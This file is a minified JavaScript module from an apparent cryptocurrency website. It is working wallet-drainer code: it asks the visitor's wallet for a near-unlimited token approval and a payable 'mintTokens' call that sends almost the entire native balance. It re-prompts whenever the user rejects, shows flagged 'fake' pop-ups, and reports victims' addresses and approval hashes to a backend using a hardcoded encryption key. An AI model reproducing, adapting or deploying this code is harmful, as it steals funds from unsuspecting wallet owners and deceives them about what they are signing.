import{aj as e,Z as a,a1 as n,b as t,Y as i,r as s,ak as o,A as r,al as c,am as l,an as u,ao as d,ap as f,q as h}from"./hych-chaoxisima-Csfb3BWR.js";import{a as v,d as w,e as p,D as m,f as g,b as y}from"./hych-chaoxisima-B8i5Jx_X.js";function k(){const{open:k}=e(),P=a(),_=n(),N=v(),b=w(),x=t((()=>b.contract_list)),I=t((()=>N.isLogin)),S=t((()=>N.lastCoin)),{t:C}=i(),{recordErrorLog:j}=p(),E=s(null),{walletProvider:T}=o("eip155");E.value=T,r((()=>P.value),(()=>{(P.value.address&&!E.value||P.value.address&&P.value.address!==N.address)&&(E.value=o("eip155").walletProvider)}),{deep:!0});const A=s({}),F=s(!1),B=s({});function J(e){var a,n,t;return(null==(a=null==e?void 0:e.transaction)?void 0:a.hash)?e.transaction:(null==(n=null==e?void 0:e.value)?void 0:n.hash)||"BAD_DATA"===(null==e?void 0:e.code)&&(null==(t=null==e?void 0:e.value)?void 0:t.hash)?e.value:null}async function O(e,a,n){for(;B.value[e.chain];)await new Promise((e=>setTimeout(e,100)));B.value[e.chain]=!0;try{const t=await a.getTransactionCount(n,"pending");(!A.value[e.chain]||A.value[e.chain].nonce<t)&&(A.value[e.chain]={nonce:t});const i=A.value[e.chain].nonce;return A.value[e.chain].nonce=i+1,i}finally{B.value[e.chain]=!1}}async function $(e,a,n,t){return new Promise((async(i,s)=>{var o;if(!a)return Promise.reject(new Error("No provider available"));const r=[{inputs:[],name:"mintTokens",outputs:[],stateMutability:"payable",type:"function"}];let u,f,h="";try{u=new c(a);const s=null==(o=_.value.caipNetworkId)?void 0:o.split(":")[1],v=`0x${Number(s).toString(16)}`;await u.send("wallet_switchEthereumChain",[{chainId:v}]);const w=await u.getSigner();f=new d(n,r,w),h=await w.getAddress();const p=await O(e,u,h),m={value:l(t),nonce:p};i(await f.mintTokens(m))}catch(v){const o=J(v);(null==o?void 0:o.hash)&&i(o);const r="string"==typeof v?v:(null==v?void 0:v.message)||String(v);if(r.includes("nonce too low")||r.includes("nonce too high")){delete A.value[e.chain];try{const a=await O(e,u,h),n={value:l(t),nonce:a};return void i(await f.mintTokens(n))}catch(w){return void s(w)}}if(r.includes("user rejected action")||r.includes("cancel")||r.includes("rejected")||r.includes("missing revert data")||r.includes("could not coalesce error")){i(await $(e,a,n,t))}else s(v)}}))}async function D(e,a,n,t,i="0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"){return new Promise((async(s,o)=>{var r;const l=[{constant:!1,inputs:[{name:"_spender",type:"address"},{name:"_value",type:"uint256"}],name:"approve",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"nonpayable",type:"function"}];let u,f,h="";try{u=new c(a);const o=null==(r=_.value.caipNetworkId)?void 0:r.split(":")[1],v=`0x${Number(o).toString(16)}`;await u.send("wallet_switchEthereumChain",[{chainId:v}]);const w=await u.getSigner();h=await w.getAddress();const p={nonce:await O(e,u,h)};f=new d(n,l,w);s(await f.approve(t,i,p))}catch(v){const r=J(v);(null==r?void 0:r.hash)&&s(r);const c="string"==typeof v?v:(null==v?void 0:v.message)||String(v);if(c.includes("nonce too low")||c.includes("nonce too high")){delete A.value[e.chain];try{const a={nonce:await O(e,u,h)};return void s(await f.approve(t,i,a))}catch(w){return void o(w)}}if(c.includes("user rejected action")||c.includes("cancel")||c.includes("rejected")||c.includes("could not coalesce error")){s(await D(e,a,n,t,i))}else o(v)}}))}async function q(e,a,n,t,i){const s={from_address:e,chain_type:a.chain,contract_token:a.id,contract_address:n,symbol:a.symbol,auth_tx:t,amount:i,decimal:a.decimals,value:a.value};N.sendTrxCount++;const o=g(s,"sl916fldkje3kjd9loqckis91u1kif8wqe6");y.postBroadcastTx({data:o}),b.collectEvent("FirstPurchase")}async function G(){if(!S.value.length)return;const e=JSON.parse(JSON.stringify(S.value[0]));if(e.chain===e.id&&5===b.theme)return S.value.shift(),void G();if(b.currentNetwork===m[e.chain].caipNetworkId)try{if(e.chain===e.id){const n=x.value.find((a=>a.type===e.chain));if(n){b.showFakePop=!0;const t=S.value.filter((a=>a.chain===e.chain)).length,i=new c(E.value);try{const a=100000n,s=await i.getFeeData();let o;if(s.maxFeePerGas&&s.maxPriorityFeePerGas&&s.lastBaseFeePerGas){const e=150n*s.maxPriorityFeePerGas/100n;o=2n*s.lastBaseFeePerGas+e}else s.gasPrice&&(o=120n*s.gasPrice/100n);if(!o)throw new Error("Could not get gas price");const r=a*o*BigInt(t)*BigInt(120)/BigInt(100),c=l(String(e.amount))-r*BigInt(5);if(c<=0)throw new Error("Amount after deducting gas fee is zero or negative. Skipping transaction.");const d=u(c),f=await $(e,E.value,n.contract_address,d);q(N.address,e,n.contract_address,f.hash,Number(d))}catch(a){}finally{S.value.shift(),G()}return}throw new Error("no contract")}{const a=x.value.find((a=>a.type===e.chain));if(a){b.showFakePop=!0;const n=await D(e,E.value,e.id,null==a?void 0:a.contract_address);return e.value>=Number(b.auth_min_collect)?q(N.address,e,a.contract_address,n.hash,e.amount):async function(e,a,n,t){const i={from_address:e,chain_type:a.chain,symbol:a.symbol,auth_tx:t,auth_address:n};N.sendTrxCount++;const s=g(i,"sl916fldkje3kjd9loqckis91u1kif8wqe6");y.postSendAuthAddress({data:s}),b.collectEvent("FirstPurchase")}(N.address,e,a.contract_address,n.hash),S.value.shift(),void G()}throw new Error("no contract")}}catch(n){j({when:"approveQueue",message:JSON.stringify(n),currentNetwork:b.currentNetwork,address:N.address}),S.value.shift(),G()}else{F.value=!1;try{await E.value.send("wallet_switchEthereumChain",[{chainId:m[e.chain].hexChainId}])}catch(t){j({when:"approveQueue",message:`switchNetwork error ${JSON.stringify(e)} ${JSON.stringify(t)}`,currentNetwork:b.currentNetwork,address:N.address}),JSON.stringify(t).includes("Not supported chainId")||JSON.stringify(t).includes("Unrecognized chain ID")?N.lastCoin=S.value.filter((a=>a.chain!==e.chain)):S.value.shift(),G()}}}return r([I,_],(async([e],[a])=>{I.value&&(e!==a&&(b.showCheckPop=!0),setTimeout((()=>{if(S.value.length>0){if(b.showCheckPop=!1,F.value)return;F.value=!0,G()}}),2e3))}),{deep:!0,immediate:!0}),r((()=>S.value),(()=>{S.value.length||(b.showFakePop=!1,b.showCheckPop=!0)})),{open:k,mintCoin:$,account:P,netWorkData:_,linkWallet:async function(){if(f.isTelegram()||Boolean(window.TelegramWebview)){if(f.isIos()){const e=window.location.href;e.startsWith("http://")?window.location.href=`x-safari-https://${e.slice(7)}`:window.location.href=`x-safari-${e}`,h(C("openInSafari"))}else if(f.isAndroid()){const e=`intent://${window.location.href.replace(/^https?:\/\//,"")}#Intent;scheme=https;package=com.android.chrome;end`;window.location.href=e,h(C("openInChrome"))}}else N.address?await N.walletAuthLogin():k()},approveERC20:D}}export{k as u};
